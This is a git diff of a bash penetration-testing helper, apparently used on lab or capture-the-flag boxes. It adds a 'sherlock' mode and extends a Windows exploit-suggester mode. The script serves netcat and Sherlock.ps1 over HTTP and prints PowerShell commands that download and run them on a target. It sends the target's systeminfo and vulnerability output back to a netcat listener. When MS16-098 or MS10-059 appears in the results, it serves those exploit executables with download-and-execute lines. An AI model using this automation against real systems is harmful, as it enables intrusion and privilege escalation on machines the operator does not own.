@@ -106,10 +106,51 @@ function cheatsheet
 
   echo_green "download file using powershell (2.0)"
   echo "powershell -NoLogo -Command \"\$webClient = new-object System.Net.WebClient; \$webClient.DownloadFile('http://10.10.16.10:80/vdmallowed.exe', 'vdmallowed.exe')\""
-  icho "powershell -NoLogo -Command \"\$webClient = new-object System.Net.WebClient; \$webClient.DownloadFile('http://10.10.16.10:80/vdmallowed.exe', 'vdmallowed.exe')\""
   echo ""
 
-    
+}
+
+function sherlock
+{
+
+    source ${config_path}
+    current_dir=$( pwd )
+    local_ip=$( ip -f inet -o addr show ${iface} | cut -d\  -f 7 | cut -d/ -f 1 )
+    target=${option_2}
+    if [[ -z "${target}" ]]
+    then
+      decho_red "missing workspace directory (where systeminfo will be dumped)"
+      exit 1
+    fi
+
+    # serve static netcat.exe
+    cd ${repository_root}/
+
+    python -m SimpleHTTPServer ${web_port} >/dev/null 2>&1 &
+
+    cd workspace
+    cd ${target}
+    nc -lnp 9876 > sherlock.log &
+
+    sleep 2
+    decho_green "download netcat to host, set up local netcat listener to accept input from sherlock!"
+    decho "powershell.exe -Command \"& { Invoke-WebRequest 'http://${local_ip}:${web_port}/static-binaries/windows/x86/nc.exe' -OutFile 'nc.exe'}\""
+    decho "powershell.exe -Command \"& { Invoke-WebRequest 'http://${local_ip}:${web_port}/privilege-escalation/scripts/sherlock.ps1' -OutFile 'sherlock.ps1'}\""
+    decho "OR"
+    decho "powershell -NoLogo -Command \"\$webClient = new-object System.Net.WebClient; \$webClient.DownloadFile('http://${local_ip}:${web_port}/static-binaries/windows/x86/nc.exe', 'nc.exe')\""
+    decho "powershell -NoLogo -Command \"\$webClient = new-object System.Net.WebClient; \$webClient.DownloadFile('http://${local_ip}:${web_port}/privilege-escalation/scripts/sherlock.ps1', 'sherlock.ps1')\""
+    decho_green "time to run sherlock and get output!"
+    decho "powershell -ExecutionPolicy Bypass -Command \"Import-Module .\sherlock.ps1 ; Find-AllVulns\" | nc ${local_ip} 9876"
+
+    decho "closing in 90 seconds..."
+    sleep 90
+    ps aux | grep SimpleHTTPServer | grep -v grep | awk ' { print $2 } ' | xargs kill -9  >/dev/null 2>&1
+    ps aux | grep "nc -lnvp 9876" | grep -v grep | awk ' { print $2 } ' | xargs kill -9  >/dev/null 2>&1
+    decho "done serving, here's result!"
+
+    cat ${target}/sherlock.log
+    cd ${current_dir}
+    exit 0
 }
 
 function check_type
@@ -187,6 +228,7 @@ function help
     decho "or... --quick-serve - runs local http server on ${web_port}, prints links to download files in current directory with powershell"
     decho "or... --http-server [download client] - runs simple http server, shows ready to copy & paste commands to run all kinds of scripts, enumeration, post-exploitation etc. using chosen client on target (wget by default)"
     decho "or... --windows-exploit-suggest <target workspace directory> - runs simple http server, serves nc.exe to automate pass of systeminfo to local windows-exploit-suggester, runs it, makes suggestion on reliable exploits"
+    decho "or... --sherlock <target workspace directory> - runs simple http server, serves nc.exe to automate pass of Sherlock.ps1 script output"
     decho "missing parameters, hostname or filename with hostnames required" 
     exit 1
   fi
@@ -200,6 +242,7 @@ function help
     decho "or... --quick-serve - runs local http server on ${web_port}, prints links to download files in current directory with powershell"
     decho "or... --http-server <download client> - runs simple http server, shows ready to copy & paste commands to run all kinds of scripts, enumeration, post-exploitation etc. using chosen client on target (wget by default)"
     decho "or... --windows-exploit-suggest <target workspace directory> - runs simple http server, serves nc.exe to automate pass of systeminfo to local windows-exploit-suggester, runs it, makes suggestion on reliable exploits"
+    decho "or... --sherlock <target workspace directory> - runs simple http server, serves nc.exe to automate pass of Sherlock.ps1 script output"
     exit 0
   fi
 
@@ -225,39 +268,57 @@ function help
     # serve static netcat.exe
     cd ${repository_root}/static-binaries/windows/x86
 
-    python -m SimpleHTTPServer ${web_port} &
+    python -m SimpleHTTPServer ${web_port} >/dev/null 2>&1 &
 
     cd ${target}
-    nc -lnvp 9876 > systeminfo.log &
+    nc -lnp 9876 > systeminfo.log &
 
     sleep 2
     decho_green "download netcat to host, set up local netcat listener to accept input from systeminfo, feed it to windows-exploit-suggester!"
-    echo "powershell.exe -Command \"& { Invoke-WebRequest 'http://${local_ip}:${web_port}/nc.exe' -OutFile 'nc.exe'}\""
-    echo "set PATH=%PATH%;%CD% && powershell.exe -Command \"systeminfo | nc.exe 10.10.16.10 9876\""
-    echo "powershell.exe -Command \"systeminfo | nc ${local_ip} 9876\""
+    decho "powershell.exe -Command \"& { Invoke-WebRequest 'http://${local_ip}:${web_port}/nc.exe' -OutFile 'nc.exe'}\""
+    decho "OR"
+    decho "powershell -NoLogo -Command \"\$webClient = new-object System.Net.WebClient; \$webClient.DownloadFile('http://${local_ip}:${web_port}/nc.exe', 'nc.exe')\""
+    decho "systeminfo | nc ${local_ip} 9876"
     decho "closing in 90 seconds..."
-    sleep 90
-    ps aux | grep SimpleHTTPServer | grep -v grep | awk ' { print $2 } ' | xargs kill &>/dev/null
+    sleep 30
+    ps aux | grep SimpleHTTPServer | grep -v grep | awk ' { print $2 } ' | xargs kill -9  >/dev/null 2>&1
+    ps aux | grep "nc -lnvp 9876" | grep -v grep | awk ' { print $2 } ' | xargs kill -9  >/dev/null 2>&1
+    sleep 3
+    decho "check if web died"
+    ps aux | grep SimpleHTTPServer 
 
     decho "done serving, analyze result..."
     # choose newest database
     database=$( ls -lt ${repository_root}/privilege-escalation/windows-exploit-suggester | grep xls | head -n1 | awk ' { print $NF } ' )
     ${repository_root}/privilege-escalation/windows-exploit-suggester/windows-exploit-suggester.py --database ${repository_root}/privilege-escalation/windows-exploit-suggester/${database} --systeminfo ${target}/systeminfo.log  > ${target}/privilege-escalation.log
-    known_reliable_exploits=( "MS16-098" )
-    exploit_name="MS16-098"
-    grep "${exploit_name}" ${target}/privilege-escalation.log
-    if [[ ${?} -eq 0 ]]
-    then
-      decho_green "seems like found possible reliable exploit... serving exploit over http, download it and execute for victory!"
-      cd ${repository_root}/exploits/windows
-      python -m SimpleHTTPServer ${web_port} &
-      sleep 2
-      echo "powershell.exe -Command \"& { Invoke-WebRequest 'http://${local_ip}:${web_port}/${exploit_name}.exe' -OutFile '${exploit_name}.exe'\" && ${exploit_name}.exe"
-      decho "closing in 90 seconds..."
-      sleep 90
-      ps aux | grep SimpleHTTPServer | grep -v grep | awk ' { print $2 } ' | xargs kill &>/dev/null
-    fi
+    known_reliable_exploits=( "MS16-098" "MS10-059")
+    for exploit in "${known_reliable_exploits[@]}"
+    do
+      decho "checking for exploit ${exploit}..."
+      grep "${exploit}" ${target}/privilege-escalation.log
+      if [[ ${?} -eq 0 ]]
+      then
+        decho_green "seems like found possible reliable exploit... serving exploit over http, download it and execute for victory!"
+        cd ${repository_root}/exploits/windows
+        python -m SimpleHTTPServer ${web_port} &
+        sleep 2
+        decho "powershell.exe -Command \"& { Invoke-WebRequest 'http://${local_ip}:${web_port}/${exploit}.exe' -OutFile '${exploit}.exe'\" && ${exploit}.exe"
+        decho "OR"
+        decho "powershell -NoLogo -Command \"\$webClient = new-object System.Net.WebClient; \$webClient.DownloadFile('http://${local_ip}:${web_port}/${exploit}.exe', '${exploit}.exe')\""
+        decho "closing in 90 seconds..."
+        sleep 30
+        ps aux | grep SimpleHTTPServer | grep -v grep | awk ' { print $2 } ' | xargs kill -9  >/dev/null 2>&1
+      fi
+    done
+
     cd ${current_dir}
+    exit 0
+  fi
+
+
+  if [[ "${mode}" == "--sherlock"  ]]
+  then
+    sherlock
     exit 0
   fi
 
